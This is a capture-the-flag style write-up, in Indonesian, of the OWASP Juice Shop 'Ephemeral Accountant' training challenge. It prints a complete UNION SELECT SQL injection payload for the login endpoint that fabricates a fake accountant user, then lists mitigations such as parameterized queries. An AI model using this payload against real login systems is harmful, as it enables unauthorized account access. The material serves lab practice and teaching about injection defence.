# Soal
- **Kategori**: Web – Injection  
- **Poin**    : ★★★★ (4 bintang)  
- **Judul**   : Ephemeral Accountant  
- **Tag**     : (tidak ada tag khusus)  

## Deskripsi 
Log in with the (non-existing) accountant `acc0unt4nt@juice-sh.op` without ever registering that user.

## Hint 
1. Try to create the needed user "out of thin air".  
2. The user literally needs to be ephemeral as in "lasting for only a short time".  
3. Registering normally with the user’s email address will then obviously not solve this challenge. The Juice Shop will not even let you register as `acc0unt4nt@juice-sh.op`, as this would make the challenge unsolvable for you.  
4. Getting the user into the database some other way will also fail to solve this challenge. In case you somehow managed  

# Resource
https://portswigger.net/web-security/sql-injection/cheat-sheet


# Step by step

1. **Intercept request login (capture HTTP POST)**  
   - Tangkap request biasa yang dikirim client ketika login:
   ```http
   POST /rest/user/login HTTP/1.1
   Host: localhost:3000
   Content-Type: application/json

   {
     "email": "user@example.com",
     "password": "password123"
   }
   ```
2. **Rancang payload UNION SELECT untuk membuat user ephemeral**

- Tujuan: sisipkan satu baris user sementara ke dalam hasil query login sehingga aplikasi menganggap user itu ada.
- Pastikan subquery meniru struktur tabel users (jumlah & urutan kolom harus cocok dengan query aplikasi).

```
{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`,
                                   'acc0unt4nt@juice-sh.op' AS `username`,
                                   'acc0unt4nt@juice-sh.op' AS `email`,
                                   'test1234' AS `password`,
                                   'accounting' AS `role`,
                                   '123' AS `deluxeToken`,
                                   '1.2.3.4' AS `lastLoginIp`,
                                   '/assets/public/images/uploads/default.svg' AS `profileImage`,
                                   '' AS `totpSecret`,
                                   1 AS `isActive`,
                                   12983283 AS `createdAt`,
                                   133424 AS `updatedAt`,
                                   NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "test1234"
}
```
Penjelasan singkat komponen:
- UNION SELECT * FROM (SELECT ... ) AS tmp → membuat row palsu dengan kolom terdefinisi.
- WHERE '1'='1' → memastikan kondisi selalu benar (opsional tapi membantu konteks).
-- → komentar untuk mengabaikan sisa query asli.

<img width="1480" height="678" alt="Screenshot 2025-09-07 142229" src="https://github.com/user-attachments/assets/ca51fd0c-dc59-4097-9481-34e035e06dcd" />


3. **Kirim request yang dimodifikasi**
- Kirim body yang diubah ke endpoint /rest/user/login.
- Tunggu response dari server.

4. **Observasi hasil (verifikasi)**
<img width="1919" height="357" alt="Screenshot 2025-09-07 142427" src="https://github.com/user-attachments/assets/e5e737d0-89eb-4bcd-a57f-1e762269cace" />

# Catatan / Pembelajaran
## Inti teknik

Teknik ini memanfaatkan UNION SELECT untuk menambahkan baris buatan (ephemeral) ke hasil query SQL sehingga aplikasi menganggap user itu benar-benar ada pada saat eksekusi query.

Baris buatan dibuat hanya untuk durasi eksekusi query — tidak ditulis permanen ke database (karena diciptakan di hasil UNION, bukan INSERT).

## Hal penting saat membangun payload

Jumlah kolom & tipe kolom harus sesuai dengan query asli. Jika tidak, UNION akan error.

Nama alias kolom di subquery harus dipikirkan agar aplikasi memetakan value ke field yang diharapkan (mis. kolom email dan password).

Selalu gunakan komentar (--) untuk mengabaikan sisa query asli yang bisa mengganggu injeksi.

Kadang perlu menambahkan WHERE '1'='1' atau kondisi lain agar subquery ter-trigger.

## Mengapa ini berbahaya

Teknik ini bukan sekadar bypass password — attacker dapat menciptakan data palsu yang aplikasi proses sebagai valid (ephemeral atau sementara).

Memberi akses admin/akun sensitif tanpa menulis ke DB permanen membuat deteksi berbasis perubahan DB menjadi lebih sulit.

## Mitigasi (praktik terbaik)

Prepared statements / parameterized queries — pisahkan struktur query dan data sehingga input tidak bisa mengubah SQL.

Validasi & sanitasi input — cek format email, batasi panjang, tolak karakter berbahaya.

Server-side verification — autentikasi harus memastikan user benar-benar ada dalam tabel user yang sah dan memverifikasi hash password, bukan hanya mencocokkan hasil query yang bisa dimanipulasi.

Least privilege — batasi hak akses DB untuk mencegah operasi yang tidak perlu.

Harden error handling & logging — jangan tampilkan error SQL ke user; log dan monitor pola injeksi.

Code review & pentest rutin — fokus pada endpoint autentikasi karena itu target utama attacker.
